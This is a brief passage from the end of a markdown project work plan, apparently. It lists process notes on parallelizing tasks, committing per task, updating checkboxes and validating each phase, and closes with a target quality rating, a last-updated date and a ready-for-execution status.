- Tasks within a phase can be parallelized if desired
- Commit after each task with referenced task ID
- Update this checklist as tasks complete (check boxes)
- Run phase validation before moving to next phase

---

**Target Rating**: 9.5/10 (from current 6.5/10)
**Last Updated**: 2025-01-21
**Status**: Ready for `/work-plan` execution
